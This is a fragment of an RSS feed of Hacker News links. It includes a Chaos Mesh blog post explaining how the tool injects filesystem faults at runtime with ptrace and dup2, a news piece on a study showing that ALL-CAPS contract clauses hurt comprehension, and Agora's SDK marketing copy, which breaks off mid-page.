<img src="https://i0.wp.com/craphound.com/images/data-detective.png?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/data-detective.png?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>Publishing works on long schedules, which means that long-planned books can be overtaken by events…like covid.</p>
<p>2020 was tough for those of us with books in trail, especially nonfiction. But for a few lucky writers, covid imparted a terrible salience to their books.</p>
<p>One such writer is Tim Harford, host of BBC Radio 4's More or less, which is hands-down the greatest statistical literacy program in the world, …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pluralistic.net/2021/01/04/how-to-truth/#adfraud">https://pluralistic.net/2021/01/04/how-to-truth/#adfraud</a></em></p>]]>
            </description>
            <link>https://pluralistic.net/2021/01/04/how-to-truth/#adfraud</link>
            <guid isPermaLink="false">hacker-news-small-sites-25695482</guid>
            <pubDate>Sat, 09 Jan 2021 02:19:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Simulate I/O Faults at Runtime?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25695023">thread link</a>) | @ngaut
<br/>
January 8, 2021 | https://chaos-mesh.org/blog/how-to-simulate-io-faults-at-runtime/ | <a href="https://web.archive.org/web/*/https://chaos-mesh.org/blog/how-to-simulate-io-faults-at-runtime/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p><img alt="Chaos Engineering - How to simulate I/O faults at runtime" src="https://chaos-mesh.org/assets/images/how-to-simulate-io-faults-at-runtime-39daaf89aa83a5be58402f763db0d5c5.jpg"></p><p>In a production environment, filesystem faults might occur due to various incidents such as disk failures and administrator errors. As a Chaos Engineering platform, Chaos Mesh has supported simulating I/O faults in a filesystem ever since its early versions. By simply adding an IOChaos CustomResourceDefinition (CRD), we can watch how the filesystem fails and returns errors.</p><p>In a production environment, filesystem faults might occur due to various incidents such as disk failures and administrator errors. As a Chaos Engineering platform, Chaos Mesh has supported simulating I/O faults in a filesystem ever since its early versions. By simply adding an IOChaos CustomResourceDefinition (CRD), we can watch how the filesystem fails and returns errors.</p><p>However, before Chaos Mesh 1.0, this experiment was not easy and may have consumed a lot of resources. We needed to inject sidecar containers to the Pod through the mutating admission webhooks and rewrite the <code>ENTRYPOINT</code> command. Even if no fault was injected, the injected sidecar container caused a substantial amount of overhead.</p><p>Chaos Mesh 1.0 has changed all this. Now, we can use IOChaos to inject faults to a filesystem at runtime. This simplifies the process and greatly reduces system overhead. This blog post introduces how we implement the IOChaos experiment without using a sidecar.</p><h2>I/O fault injection<a href="#io-fault-injection" title="Direct link to heading">#</a></h2><p>To simulate I/O faults at runtime, we need to inject faults into a filesystem after the program starts <a href="https://man7.org/linux/man-pages/man2/syscall.2.html" target="_blank" rel="noopener noreferrer">system calls</a> (such as reads and writes) but before the call requests arrive at the target filesystem. We can do that in one of two ways:</p><ul><li>Use Berkeley Packet Filter (BPF); however, it <a href="https://github.com/iovisor/bcc/issues/2336" target="_blank" rel="noopener noreferrer">cannot be used to inject delay</a>.</li><li>Add a filesystem layer called ChaosFS before the target filesystem. ChaosFS uses the target filesystem as the backend and receives requests from the operating system. The entire call link is <strong>target program syscall</strong> -&gt; <strong>Linux kernel</strong> -&gt; <strong>ChaosFS</strong> -&gt; <strong>target filesystem</strong>. Because ChaosFS is customizable, we can inject delays and errors as we want. Therefore, ChaosFS is our choice.</li></ul><p>But ChaosFS has several problems:</p><ul><li>If ChaosFS reads and writes files in the target filesystem, we need to <a href="https://man7.org/linux/man-pages/man2/mount.2.html" target="_blank" rel="noopener noreferrer">mount</a> ChaosFS to a different path than the target path specified in the Pod configuration. ChaosFS <strong>cannot</strong> be mounted to the path of the target directory.</li><li>We need to mount ChaosFS <strong>before</strong> the target program starts running. This is because the newly-mounted ChaosFS takes effect only on files that are newly opened by the program in the target filesystem.</li><li>We need to mount ChaosFS to the target containter's <code>mnt</code> namespace. For details, see <a href="https://man7.org/linux/man-pages/man7/mount_namespaces.7.html" target="_blank" rel="noopener noreferrer">mount_namespaces(7) — Linux manual page</a>.</li></ul><p>Before Chaos Mesh 1.0, we used the <a href="https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/" target="_blank" rel="noopener noreferrer">mutating admission webhook</a> to implement IOChaos. This technique addressed the three problems lists above and allowed us to:</p><ul><li>Run scripts in the target container. This action changed the target directory of the ChaosFS's backend filesystem (for example, from <code>/mnt/a</code> to <code>/mnt/a_bak</code>) so that we could mount ChaosFS to the target path (<code>/mnt/a</code>).
Modify the command that starts the Pod. For example, we could modify the original command <code>/app</code> to <code>/waitfs.sh /app</code>.</li><li>The <code>waitfs.sh</code> script kept checking whether the filesystem was successfully mounted. If it was mounted, <code>/app</code> was started.</li><li>Add a new container in the Pod to run ChaosFS. This container needed to share a volume with the target container (for example, <code>/mnt</code>), and then we mounted this volume to the target directory (for example, <code>/mnt/a</code>). We also properly enabled <a href="https://kubernetes.io/docs/concepts/storage/volumes/#mount-propagation" target="_blank" rel="noopener noreferrer">mount propagation</a> for this volume's mount to penetrate the share to host and then penetrate slave to the target.</li></ul><p>These three approaches allowed us to inject I/O faults while the program was running. However, the injection was far from convenient:</p><ul><li>We could only inject faults into a volume subdirectory, not into the entire volume. The workaround was to replace <code>mv</code> (rename) with <code>mount move</code> to move the mount point of the target volume.</li><li>We had to explicitly write commands in the Pod rather than implicitly use the image commands. Otherwise, the <code>/waitfs.sh</code> script could not properly start the program after the filesystem was mounted.</li><li>The corresponding container needed to have a proper configuration for mount propagation. Due to potential privacy and security issues, we <strong>could not</strong> modify the configuration via the mutating admission webhook.</li><li>The injection configuration was troublesome. Worse still, we had to create a new Pod after the configuration was able to inject faults.</li><li>We could not withdraw ChaosFS while the program was running. Even if no fault or error was injected, the performance was greatly affected.</li></ul><h2>Inject I/O faults without the mutating admission webhook<a href="#inject-io-faults-without-the-mutating-admission-webhook" title="Direct link to heading">#</a></h2><p>What about cracking these tough nuts without the mutating admission webhook? Let's get back and think a bit about the reason why we used the mutating admission webhook to add a container in which ChaosFS runs. We do that to mount the filesystem to the target container.</p><p>In fact, there is another solution. Instead of adding containers to the Pod, we can first use the <code>setns</code> Linux system call to modify the namespace of the current process and then use the <code>mount</code> call to mount ChaosFS to the target container. Suppose that the filesystem to inject is <code>/mnt</code>. The new injection process is as follows:</p><ol><li>Use <code>setns</code> for the current process to enter the mnt namespace of the target container.</li><li>Execute <code>mount --move</code> to move <code>/mnt</code> to <code>/mnt_bak</code>.</li><li>Mount ChaosFS to <code>/mnt</code> and use <code>/mnt_bak</code> as the backend.</li></ol><p>After the process is finished, the target container will open, read, and write the files in <code>/mnt</code> through ChaosFS. In this way, delays or faults are injected much more easily. However, there are still two questions to answer:</p><ul><li>How do you handle the files that are already opened by the target process?</li><li>How do you recover the process given that we cannot unmount the filesystem when files are opened?</li></ul><h3>Dynamically replace file descriptors<a href="#dynamically-replace-file-descriptors" title="Direct link to heading">#</a></h3><p><strong>ptrace solves both of the two questions above.</strong> We can use ptrace to replace the opened file descriptors (FD) at runtime and replace the current working directory (CWD) and mmap.</p><h4>Use ptrace to allow a tracee to run a binary program<a href="#use-ptrace-to-allow-a-tracee-to-run-a-binary-program" title="Direct link to heading">#</a></h4><p><a href="https://man7.org/linux/man-pages/man2/ptrace.2.html" target="_blank" rel="noopener noreferrer">ptrace</a> is a powerful tool that makes the target process (tracee) to run any system call or binary program. For a tracee to run the program, ptrace modifies the RIP-pointed address to the target process and adds an <code>int3</code> instruction to trigger a breakpoint. When the binary program stops, we need to restore the registers and memory.</p><blockquote><p><strong>Note:</strong></p><p>In the <a href="https://en.wikipedia.org/wiki/X86_assembly_language" target="_blank" rel="noopener noreferrer">x86_64 architecture</a>, the RIP register (also called an instruction pointer) always points to the memory address at which the next directive is run.
To load the program into the target process memory spaces:</p></blockquote><ol><li>Use ptrace to call mmap in the target program to allocate the needed memory.</li><li>Write the binary program to the newly allocated memory and make the RIP register point to it.</li><li>After the binary program stops, call munmap to clean up the memory section.</li></ol><p>As a best practice, we often replace ptrace <code>POKE_TEXT</code> writes with <code>process_vm_writev</code> because if there is a huge amount of data to write, <code>process_vm_writev</code> performs more efficiently.</p><p>Using ptrace, we are able to make a process to replace its own FD. Now we only need a method to make that replacement happen. This method is the <code>dup2</code> system call.</p><h4>Use <code>dup2</code> to replace file descriptor<a href="#use-dup2-to-replace-file-descriptor" title="Direct link to heading">#</a></h4><p>The signature of the <code>dup2</code> function is <code>int dup2(int oldfd, int newfd);</code>. It is used to create a copy of the old FD (<code>oldfd</code>). This copy has an FD number of <code>newfd</code>. If <code>newfd</code> already corresponds to the FD of an opened file, the FD on the file that's already opened is automatically closed.</p><p>For example, the current process opens <code>/var/run/__chaosfs__test__/a</code> whose FD is <code>1</code>. To replace this opened file with <code>/var/run/test/a</code>, this process performs the following operations:</p><ol><li>Uses the <code>fcntl</code> system call to get the <code>OFlags</code> (the parameter used by the <code>open</code> system call, such as <code>O_WRONLY</code>) of <code>/var/run/__chaosfs__test__/a</code>.</li><li>Uses the <code>Iseek</code> system call to get the current location of <code>seek</code>.</li><li>Uses the <code>open</code> system call to open <code>/var/run/test/a</code> using the same <code>OFlags</code>. Assume that the FD is <code>2</code>.</li><li>Uses <code>Iseek</code> to change the <code>seek</code> location of the newly opened FD <code>2</code>.</li><li>Uses <code>dup2(2, 1)</code> to replace the FD <code>1</code> of <code>/var/run/__chaosfs__test__/a</code> with the newly opened FD <code>2</code>.</li><li>Closes FD <code>2</code>.</li></ol><p>After the process is finished, FD <code>1</code> of the current process points to <code>/var/run/test/a</code>. So that we can inject faults, any subsequent operations on the target file go through the <a href="https://en.wikipedia.org/wiki/Filesystem_in_Userspace" target="_blank" rel="noopener noreferrer">Filesystem in Userspace</a> (FUSE). FUSE is a software interface for Unix and Unix-like computer operating systems that lets non-privileged users create their own file systems without editing kernel code.</p><h4>Write a program to make the target process replace its own file descriptor<a href="#write-a-program-to-make-the-target-process-replace-its-own-file-descriptor" title="Direct link to heading">#</a></h4><p>The combined functionality of ptrace and dup2 make it possible for the tracer to make the tracee replace the opened FD by itself. Now, we need to write a binary program and make the target process run it:</p><blockquote><p><strong>Note:</strong></p><p>In the implementation above, we assume that:</p><ul><li>The threads of the target process are POSIX threads and share the opened files.</li><li>When the target process creates threads using the <code>clone</code> function, the <code>CLONE_FILES</code> parameter is passed.</li></ul><p>Therefore, Chaos Mesh only replaces the FD of the first thread in the thread group.</p></blockquote><ol><li>Write a piece of assembly code according to the two sections above and the usage of syscall directives. <a href="https://github.com/chaos-mesh/toda/blob/1d73871d8ab72b8d1eace55f5222b01957193531/src/replacer/fd_replacer.rs#L133" target="_blank" rel="noopener noreferrer">Here</a> is an example of the assembly code.</li><li>Use an assembler to translate the code into a binary program. We use <a href="https://github.com/CensoredUsername/dynasm-rs" target="_blank" rel="noopener noreferrer">dynasm-rs</a> as the assembler.</li><li>Use ptrace to make the target process run this program.
When the program runs, the FD is replaced at runtime.</li></ol><h3>Overall fault injection process<a href="#overall-fault-injection-process" title="Direct link to heading">#</a></h3><p>The following diagram illustrates the overall I/O fault injection process:</p><p><img alt="Fault injection process" src="https://chaos-mesh.org/assets/images/fault-injection-process-581a3b4c6954f9ccb3fc9eb17f45f937.jpg"></p><p> Fault injection process </p><p>In this diagram, each horizontal line corresponds to a thread that runs in the direction of the arrows. The <strong>Mount/Umount Filesystem</strong> and <strong>Replace FD</strong> tasks are carefully arranged in sequence. Given the process above, this arrangement makes a lot of sense.</p><h2>What's next<a href="#whats-next" title="Direct link to heading">#</a></h2><p>I've discussed how we implement fault injection to simulate I/O faults at runtime (see <a href="https://github.com/chaos-mesh/toda" target="_blank" rel="noopener noreferrer">chaos-m…</a></p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://chaos-mesh.org/blog/how-to-simulate-io-faults-at-runtime/">https://chaos-mesh.org/blog/how-to-simulate-io-faults-at-runtime/</a></em></p>]]>
            </description>
            <link>https://chaos-mesh.org/blog/how-to-simulate-io-faults-at-runtime/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25695023</guid>
            <pubDate>Sat, 09 Jan 2021 01:48:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Contractual texts written in ALL-CAPS are harder to read, yet remain in use]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25694496">thread link</a>) | @sharondolovsky
<br/>
January 8, 2021 | https://www.psychnewsdaily.com/new-study-shows-contractual-texts-written-in-all-caps-hinder-comprehension-yet-they-remain-in-use/ | <a href="https://web.archive.org/web/*/https://www.psychnewsdaily.com/new-study-shows-contractual-texts-written-in-all-caps-hinder-comprehension-yet-they-remain-in-use/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-5963" role="main"><div><div><div><p>Contractual agreements often make generous use of “ALL-CAPS” to draw special attention to the important parts of the text. The idea, ostensibly, is that by making those capitalized terms stand out, consumers will pay more attention to them.</p><p>But as the authors of <a href="https://onlinelibrary.wiley.com/doi/10.1111/jels.12272" target="_blank" rel="noreferrer noopener">a new paper on all-caps</a> explain, the notion that this archaic technique improves consumer consent has never been validated. Even today, there is still no empirical evidence to support it.</p><p>So researchers Yonathan Arbel and Andrew Toler, of the University of Alabama School of Law, decided to put all-caps to the test. In several experiments, they found no benefits to capitalizing blocks of text in a contract. If anything, readers, especially older readers, found that text written in all-caps is harder to understand.</p><p>Their new paper appeared in November in the <em><a href="https://onlinelibrary.wiley.com/journal/17401461" target="_blank" rel="noreferrer noopener">Journal of Empirical Legal Studies</a></em>. Its authors say it is the first “to empirically examine the effectiveness of all‐caps.”</p><h2>A bad idea with a long history</h2><p>This lack of prior research into the contractual use of all-caps is odd. The practice is quite old, and the stakes are high. The belief in the benefits of capitalization dates back to at least the 19th century. And even today, many courts, legislators, and government agencies still insist that the key terms of a contract be displayed in all-caps, ostensibly to protect consumers.<span data-ez-name="psychnewsdaily_com-medrectangle-4"></span></p><p>Courts, for example, often rule that text written in capital letters makes it sufficiently conspicuous. Likewise, if key parts of a contract are not written in all-caps, courts will often deny enforcement.</p><p>This practice has serious and wide-ranging effects. It influences contractual liability in areas such as wrongful death claims, arbitration agreements, and consumer warranties.</p><p>So if all‐caps formatting does not in fact improve “the meaningfulness of assent,” as the authors write, “then courts have been erroneously enforcing onerous terms,” and have been “depriving consumers of recourse based on faulty assumptions.”</p><h2>All-caps everywhere</h2><p>For this study, the authors collected standard contracts from 500 companies in the United States, such as Google, Facebook, Uber, and Amazon. They found that 77% of these contracts have at least one clause in all-caps, suggesting the practice is still very much alive.</p><p>They also tested whether all-caps formatting actually helps people to comprehend or recall such contractual clauses. Using Amazon’s Mechanical Turk, they recruited a sample of 570 participants in the United States. About 45% of them were female, and their average age was 38.</p><p>The researchers instructed the participants to read through a two‐page contract, containing 15 paragraphs. They modelled this document on Spotify’s end-user agreement. One version, read by half of the participants, contained one paragraph written in all-caps. The other half of the subjects read the same contract, only with this paragraph written using normal capitalization. The researchers then tested how accurately the participants answered questions about a term that appeared in that paragraph.</p><h2>No helpful effect at all</h2><p>They found that all‐caps had no effect on improving the readers’ comprehension or recall. Instead, they found some evidence that all‐caps actually decreases comprehension for older readers. Participants older than 55 were 29% <em>more</em> likely to misunderstand their obligations when they read the contract with the capitalized paragraph. In fact, “the older group answered incorrectly at almost double the rate of same‐age peers in the control group,” who read the same paragraph with normal formatting.</p><p>A smaller experiment also found that all-caps offered no benefits when the text had to be read very quickly. Another test showed that an all-caps version of a text was 22% more difficult to read and understand. And a final experiment demonstrated that all‐caps paragraphs take 13% longer to read, without leading to any improvement in recall.</p><h2>Why does block capitalization fail?</h2><p>Past research has shown that all‐caps formatting obscures the differences between letters, because capital letters lack ascenders and descenders. That sameness makes the text harder to read.</p><p>Cultural changes also play a role. Long ago, capital letters signified grandeur and seriousness. But in today’s Internet culture, the authors point out, “there is a growing convention that <a href="https://newrepublic.com/article/117390/netiquette-capitalization-how-caps-became-code-yelling" target="_blank" rel="noreferrer noopener">all‐caps is similar in effect to yelling</a>.” This negative emotional association might encourage readers, consciously or unconsciously, to ignore text written in all-caps.</p><p>Add to that the fact <a href="https://www.psychnewsdaily.com/why-are-americans-vocabulary-skills-stagnating/" target="_blank" rel="noreferrer noopener">Americans’ vocabulary levels are dropping</a>, and it soon becomes clear that a lot of contractual texts aren’t being properly read.</p><h2><strong>Dubious incentives</strong> to hide contractual liability</h2><p>Though typical sales texts will capitalize some words (BUY NOW!), they rarely capitalize entire paragraphs in the way contracts do. In other words, when companies want to make important features conspicuous, they use a range of design tools such as varying colors, typefaces, and backgrounds. These texts “have no resemblance to the texts they use to obligate and bind consumers,” the authors write.</p><p>So why do companies continue to use all-caps in texts that should ideally make contractual liability crystal clear? Do they “genuinely believe,” the authors ask, “that using all‐caps will promote consumer understanding?” A more sinister interpretation is that companies “take advantage of judicial naiveté to <a href="https://scholars.law.unlv.edu/facpub/1063/" target="_blank" rel="noreferrer noopener">hide some of the most onerous and costly terms in plain sight</a> by using all‐caps.” In this scenario, the authors write, “not only do courts not protect consumers’ interests by favoring all‐caps, they invite abuse.”</p><h2><strong>A better and bolder alternative</strong> to all caps</h2><p>So if archaic and shouty all-caps formatting doesn’t work, what does?</p><p>The researchers compared four other ways of highlighting text, and found that boldface had the most promising results.</p><p>In two experiments, bold text outperformed “boxing” text in a <a href="https://en.wikipedia.org/wiki/Schumer_box" target="_blank" rel="noreferrer noopener">so-called Schumer Box</a> (New York Senator Chuck Schumer sponsored legislation to make credit card statements easier to understand).</p><p>It aso outperformed “single caps” (i.e. one sentence written in all-caps within a paragraph otherwise capitalized normally), or normal text. These results support prior research showing that readers prefer boldface over other types of emphasis. And they also demonstrate that formatting interventions can indeed improve consumers’ ability to understand the important terms of the contractual agreements they enter into.</p><p>The authors of this paper pull no punches in calling for change. “We believe that there is a compelling reason to abolish judicial reliance on all‐caps,” they write. “Courts should stop giving&nbsp;<em>any</em>&nbsp;weight to the use of all‐caps in contracts,” and “should desist the century‐old policy of encouraging firms to use them in their contracts.”</p><hr><p><strong>Study: </strong>“ALL-CAPS”<br><strong>Authors:</strong> Yonathan Arbel and Andrew Toler<br><strong>Published in:</strong> <em><a href="https://onlinelibrary.wiley.com/journal/17401461" target="_blank" rel="noreferrer noopener">Journal of Empirical Legal Studies</a></em><br><strong>Publication date: </strong>November 2, 2020<br><strong>DOI:</strong> <a href="https://doi.org/10.1111/jels.12272" target="_blank" rel="noreferrer noopener">https://doi.org/10.1111/jels.12272</a><br><strong>Photo:</strong> by&nbsp;<a href="https://www.pexels.com/@olly?utm_content=attributionCopyText&amp;utm_medium=referral&amp;utm_source=pexels">Andrea Piacquadio</a>&nbsp;via&nbsp;<a href="https://www.pexels.com/photo/woman-holding-card-while-operating-silver-laptop-919436/?utm_content=attributionCopyText&amp;utm_medium=referral&amp;utm_source=pexels">Pexels</a></p><p>For a weekly summary of the latest psychology research and psychology news, subscribe to our <a href="https://psychnewsweekly.substack.com/p/coming-soon?r=3s6yi&amp;utm_campaign=post&amp;utm_medium=email&amp;utm_source=copy" target="_blank" rel="noreferrer noopener">Psych News Weekly newsletter</a>.</p></div></div></div></article></div>]]>
            </description>
            <link>https://www.psychnewsdaily.com/new-study-shows-contractual-texts-written-in-all-caps-hinder-comprehension-yet-they-remain-in-use/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25694496</guid>
            <pubDate>Sat, 09 Jan 2021 01:21:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SDK to power Real-Time Audio products]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25694051">thread link</a>) | @zuhayeer
<br/>
January 8, 2021 | https://www.agora.io/en/products/live-interactive-audio-streaming/ | <a href="https://web.archive.org/web/*/https://www.agora.io/en/products/live-interactive-audio-streaming/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
		<div data-elementor-type="wp-page" data-elementor-id="26638" data-elementor-settings="[]">
			<div>
				<div>
							<section data-id="56032542" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				<div data-id="1533ff7f" data-element_type="column">
			<div>
					<div>
				
				<div data-id="4e22678f" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>Live Interactive Audio Streaming</p>
				</div>
				</div>
				<div data-id="6336b2f1" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>Use Agora’s Voice SDK to engage audiences with up to 192 kbps HD quality audio and real-time interaction.</p>
				</div>
				</div>
				
						</div>
			</div>
		</div>
				<div data-id="10de5709" data-element_type="column">
			<div>
					<div>
				<div data-id="27e07acf" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><img src="https://www.agora.io/en/wp-content/uploads/2020/10/voice-broadcast-en-1-2.png" title="" alt="">											</p>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="3c521f1b" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				<div data-id="1635a88a" data-element_type="column">
			<div>
					<div>
				
				<div data-id="2eacbf" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>Boost the conversation to worldwide audiences</h2>		</p>
				</div>
				<div data-id="119d8060" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>Agora’s Live Interactive Audio Streaming lets you stream stutter-free audio for professional-quality sound to audiences of any size. Our fast initial rendering and channel switching, adaptable audio bitrate, and sophisticated algorithms connect listeners quickly and without interruption.</p>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="3882e3e" data-element_type="section">
						
		</section>
				<section data-id="2bf7536" data-element_type="section">
						
		</section>
				<section data-id="7673f2e9" data-element_type="section">
						<div>
				<div>
				<div data-id="217c7f00" data-element_type="column">
			<div>
					<div>
				<section data-id="14d3327e" data-element_type="section" id="tab1-data">
						<div>
				<div>
				
				<div data-id="5be33fcb" data-element_type="column">
			<div>
					<div>
				<div data-id="303c8a7c" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><img src="https://www.agora.io/en/wp-content/uploads/2020/10/podcast.jpg" title="" alt="">											</p>
				</div>
				</div>
						</div>
			</div>
		</div>
				
				<div data-id="340c435c" data-element_type="column">
			<div>
					<div>
				<div data-id="1d2a64e4" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h3>Stream podcasts to a worldwide audience.</h3>		</p>
				</div>
				<div data-id="56f231cd" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>Whether it’s a daily news story or an interview about gardening, you want listeners to hear your podcasts without interruption or distortion.</p><p>Agora’s Live Interactive Audio Streaming ensures that your podcast streams smoothly to anyone, on any device, anywhere in the world.</p></div>
				</div>
				</div>
				
						</div>
			</div>
		</div>
				
						</div>
			</div>
		</section>
				<section data-id="6c53f7ae" data-element_type="section" id="tab2-data">
						<div>
				<div>
				
				<div data-id="38ea1966" data-element_type="column">
			<div>
					<div>
				<div data-id="76729b0c" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><img src="https://www.agora.io/en/wp-content/uploads/2020/10/online-radio.jpg" title="" alt="">											</p>
				</div>
				</div>
						</div>
			</div>
		</div>
				
				<div data-id="4a677762" data-element_type="column">
			<div>
					<div>
				<div data-id="1cff5233" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h3>Keep radio interesting with live host/audience interactions.</h3>		</p>
				</div>
				<div data-id="533f909f" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>Invite audience members to ask their questions, offer comments, or participate in contests while your radio shows are streaming live over the Internet.&nbsp;</p><p>Agora’s Live Interactive Audio Streaming lets you keep the action going, with reliable, high-quality connections to people all over the world.</p></div>
				</div>
				</div>
				
						</div>
			</div>
		</div>
				
						</div>
			</div>
		</section>
				<section data-id="1bd1e3f6" data-element_type="section" id="tab3-data">
						<div>
				<div>
				
				<div data-id="5b72f050" data-element_type="column">
			<div>
					<div>
				<div data-id="2ced1c29" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><img width="640" height="640" src="https://www.agora.io/en/wp-content/uploads/2020/10/sounds-room-1.jpg" alt="" loading="lazy">											</p>
				</div>
				</div>
						</div>
			</div>
		</div>
				
				<div data-id="611f2f62" data-element_type="column">
			<div>
					<div>
				<div data-id="2d19d79a" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h3>Keep them singing with online karaoke.</h3>		</p>
				</div>
				<div data-id="4ef0b81e" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>Your audience doesn’t need to share the same physical space in order to share a song.</p><p>Agora’s Live Interactive Audio Streaming lets you create a remote KTV experience for small or large audiences, anywhere in the world.</p></div>
				</div>
				</div>
				
						</div>
			</div>
		</div>
				
						</div>
			</div>
		</section>
				<section data-id="f018e65" data-element_type="section" id="tab4-data">
						<div>
				<div>
				
				<div data-id="19ebf6b2" data-element_type="column">
			<div>
					<div>
				<div data-id="5f0579f5" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><img width="640" height="640" src="https://www.agora.io/en/wp-content/uploads/2020/11/co-listening.jpg" alt="" loading="lazy">											</p>
				</div>
				</div>
						</div>
			</div>
		</div>
				
				<div data-id="7e75b52f" data-element_type="column">
			<div>
					<div>
				<div data-id="249a30c4" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h3>Create a virtual space for people to enjoy music together.</h3>		</p>
				</div>
				<div data-id="3ac90652" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>When people can’t be together to spin vinyl or share a playlist in person, let them have the same experience online.</p><p>With Agora’s Live Interactive Audio Streaming, you can create an online music room where users can share their favorite online DJ jams, or simply enjoy high-quality music.</p></div>
				</div>
				</div>
				
						</div>
			</div>
		</div>
				
						</div>
			</div>
		</section>
				<section data-id="398cb230" data-element_type="section" id="tab5-data">
						<div>
				<div>
				
				<div data-id="114e018" data-element_type="column">
			<div>
					<div>
				<div data-id="fe6c07e" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><img src="https://www.agora.io/en/wp-content/uploads/2020/10/commentary.jpg" title="" alt="">											</p>
				</div>
				</div>
						</div>
			</div>
		</div>
				
				<div data-id="6bbd06d1" data-element_type="column">
			<div>
					<div>
				<div data-id="7aa9c87c" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h3>Stream live audio coverage of sports and other events.</h3>		</p>
				</div>
				<div data-id="32b54469" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>Bring the action and excitement of live events to audiences who can’t be there in person.</p><p>Whether it’s play-by-play sports commentary or in-depth reporting of a major news event, Agora’s Live Interactive Audio Streaming gives you ultra low- latency streaming so the audience doesn’t miss a second of it.</p></div>
				</div>
				</div>
				
						</div>
			</div>
		</div>
				
						</div>
			</div>
		</section>
				<section data-id="5dff7138" data-element_type="section" id="tab6-data">
						<div>
				<div>
				
				<div data-id="1a4df8d0" data-element_type="column">
			<div>
					<div>
				<div data-id="7481520" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><img src="https://www.agora.io/en/wp-content/uploads/2020/10/audio-education.jpg" title="" alt="">											</p>
				</div>
				</div>
						</div>
			</div>
		</div>
				
				<div data-id="391125f0" data-element_type="column">
			<div>
					<div>
				<div data-id="6232028f" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h3>Create an interactive, online audio classroom.</h3>		</p>
				</div>
				<div data-id="6be28611" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>With Agora’s Live Interactive Audio Streaming, you can provide an ultra-low latency classroom interactive experience from anywhere. Agora’s SD-RTN™ ensures audio streams in real time without stutter or delay, so educators can teach effectively.</p>
				</div>
				</div>
				
						</div>
			</div>
		</div>
				
						</div>
			</div>
		</section>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="40884677" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				<div data-id="2a0e86f4" data-element_type="column">
			<div>
					<div>
				
				<div data-id="378f74ea" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>Use Agora’s Live Interactive Audio Streaming to provide high-quality, flexible audio experiences</h2>		</p>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="374c5086" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				<div data-id="f06142b" data-element_type="column">
			<div>
					<div>
				<section data-id="35915cbd" data-element_type="section">
						<div>
				<div>
				
				<div data-id="1ea48af2" data-element_type="column">
			<div>
					<div>
				
				<div data-id="22423ff5" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><h4><strong>Full bandwidth capture</strong></h4><p>A 48kHz (sampling rate) full-sound bandwidth capture provides the most natural audio reproduction for podcasts, music rooms, KTV, and other uses where audio quality is of critical importance. Stream audio up to 192kbps to reproduce the original audio source in high fidelity.</p><h4><strong>Fast initial rendering and channel switching</strong></h4><p>Agora’s sub-second initial audio rendering and channel-switching time creates a seamless experience for listeners.</p><h4><strong>Adaptable audio bitrate</strong></h4><p>Select an audio profile with a bitrate of 18kbps to 192kbps to provide the appropriate quality for your needs.</p><h4><strong>Smooth experience</strong></h4><p>Agora’s sophisticated network algorithms minimize latency and packet loss for a smooth, stutter-free experience without interruptions.</p></div>
				</div>
				</div>
						</div>
			</div>
		</div>
				
				<div data-id="1a4ecaf3" data-element_type="column">
			<div>
